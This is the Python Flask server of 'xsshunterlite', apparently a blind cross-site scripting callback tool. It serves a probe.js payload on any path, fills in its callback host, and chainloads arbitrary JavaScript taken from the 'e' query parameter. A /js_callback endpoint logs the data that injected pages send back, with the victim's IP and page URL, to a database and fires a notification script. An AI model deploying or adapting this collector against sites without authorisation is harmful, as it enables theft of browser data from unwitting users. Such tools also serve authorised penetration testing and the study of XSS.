#!/usr/bin/python
from flask import Flask, request, Response
from db import create_connection, insert_interaction, create_db
from flask_cors import CORS
from subprocess import run, PIPE
import logging
import os

database = r"/var/www/xsshunterlite/sqlite.db"

app = Flask(__name__)
CORS(app)

formatter = logging.Formatter(fmt='%(asctime)s %(levelname)-8s %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
handler = logging.FileHandler("/var/www/xsshunterlite/api.log")
handler.setFormatter(formatter)
app.logger.addHandler(handler)
app.logger.setLevel(logging.INFO)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def deliver_probe(path):
    web_root = os.path.dirname(app.instance_path) + "/www/"
    commonprefix = os.path.commonprefix((os.path.realpath(web_root + path), web_root))
    if commonprefix != web_root and commonprefix+"/" != web_root:
        return "Forbidden", 403

    if os.path.isfile(path) != True:
        path = 'probe.js'

    with open(web_root + path, "r", encoding="utf8") as file_handler:
        content = file_handler.read()

    domain = request.headers.get( 'Host' )
    eval = request.args.get( 'e' )
    if eval is None:
        eval = ""

    content = content.replace( '[HOSTNAME]', domain )
    content = content.replace( '[HOST_URL]', "https://" + domain )
    content = content.replace( '[CHAINLOAD_REPLACE_ME]', eval )

    return Response(content, mimetype='text/javascript')

@app.route('/js_callback', methods=['POST'])
def record_interaction():
    app.logger.info('Recording callback')

    json = request.get_json(force=True)
    json['client_ip'] = request.remote_addr

    notificationText='xss callback from {}|{}\n'.format(json['client_ip'],json['url'])
    run(['/var/www/xsshunterlite/notify_xss.sh'], stdout=PIPE, input=notificationText.encode('utf-8'))

    try:
        conn = create_connection(database)
        insert_interaction(conn, json)
    except Exception as e:
        app.logger.error(e)
    finally:
        conn.close()

    return "ok"

app.logger.info('Starting xsshunterlite')

conn = create_connection(database)
try:
    create_db(conn)
finally:
    conn.close()
